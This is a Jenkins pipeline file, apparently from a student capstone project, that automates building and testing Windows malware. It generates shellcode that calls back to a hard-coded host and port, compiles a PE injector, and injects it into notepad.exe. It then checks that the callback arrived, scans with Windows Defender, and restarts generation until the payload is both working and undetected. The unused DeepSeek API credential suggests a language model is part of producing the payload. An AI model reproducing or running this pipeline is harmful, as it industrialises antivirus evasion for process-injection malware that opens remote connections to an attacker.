pipeline {
    agent none

    environment {
        DEEPSEEK_CREDENTIALS = credentials('deepseek-api-key')
        LHOST = '100.85.95.64'
        LPORT = 4444
        HOSTNAME = 'student-virtual-machine'
        MALWARE_DIR = 'Simple/PE-Injector/PE-Injector.cpp'
        EXECUTABLE_NAME = 'injector.exe'
    }

    stages {
        stage('Checkout Code') {
            agent { label 'linux' }
            steps {
                checkout([
                    $class: 'GitSCM',
                    branches: [[name: 'staging']],
                    userRemoteConfigs: [[
                        url: 'git@github.com:sapph2c/capstone.git',
                        credentialsId: 'git-ssh'
                    ]]
                ])
            }
        }

        stage('Generate shellcode') {
            agent { label 'linux' }
            steps {
                dir('src') {
                    sh 'make LHOST=$LHOST LPORT=$LPORT HOSTNAME=$HOSTNAME all'
                }
            }
        }

        stage('Compile and Stash Malware') {
            agent { label 'linux' }
            steps {
                dir('src') {
                    sh 'x86_64-w64-mingw32-g++ -std=c++17 -static -o $EXECUTABLE_NAME $MALWARE_DIR -lpsapi'
                    stash includes: "$EXECUTABLE_NAME", name: 'compiled_malware'
                }
            }
        }

        stage('Execute Malware and Test Callback') {
            agent none
            stages {
                stage('Start Listener') {
                    agent { label 'linux' }
                    steps {
                        dir('scripts') {
                            sh '''
                                (uv run pipeline callback; echo $? > callback_result.txt) &
                                echo $! > listener.pid
                            '''
                        }
                    }
                }

                stage('Run Malware') {
                    agent { label 'windows' }
                    steps {
                        dir('testing') {
                            unstash 'compiled_malware'
                            powershell '''
                                $proc = Start-Process -FilePath 'notepad.exe' -PassThru
                                Start-Sleep -Seconds 2
                                $targetPid = $proc.Id
                                Write-Host "Target PID: $targetPid"
                                Start-Process -FilePath ".\\injector.exe" -ArgumentList $targetPid
                            '''
                        }
                    }
                }

                stage('Evaluate Callback and AV Detection') {
                    agent { label 'linux' }
                    steps {
                        dir('scripts') {
                            sh '''
                                echo "[*] Waiting for callback_result.txt to appear..."
                                for i in {1..30}; do
                                    if [ -f callback_result.txt ]; then
                                        echo "[*] File found!"
                                        break
                                    fi
                                    sleep 1
                                done

                                if [ ! -f callback_result.txt ]; then
                                    echo "[!] callback_result.txt was never created!"
                                    exit 1
                                fi
                            '''
                        }
                    }

                    post {
                        always {
                            script {
                                def result = sh(script: 'cat scripts/callback_result.txt', returnStdout: true).trim()
                                echo "Callback listener exited with code: ${result}"

                                // Trigger rerun if callback failed
                                def shouldRetry = (result != '0')

                                // Run Defender scan to detect AV alerts
                                def avOutput = powershell(script: '''
                                    $ScanResult = Start-MpScan -ScanType CustomScan -ScanPath "C:\\Jenkins\\workspace\\Malware_Pipeline_staging\\testing"
                                    $Events = Get-MpThreatDetection | Out-String
                                    Write-Output $Events
                                    if ($Events -match 'injector.exe') { exit 1 } else { exit 0 }
                                ''', returnStatus: true)

                                if (avOutput != 0) {
                                    echo "[!] Windows Defender detected the malware!"
                                    shouldRetry = true
                                }

                                if (shouldRetry) {
                                    currentBuild.description = 'Callback failed or AV alert — restarting from Generate Shellcode'
                                    build job: env.JOB_NAME,
                                          parameters: [string(name: 'RESTART_STAGE', value: 'generate')],
                                          wait: false
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
}

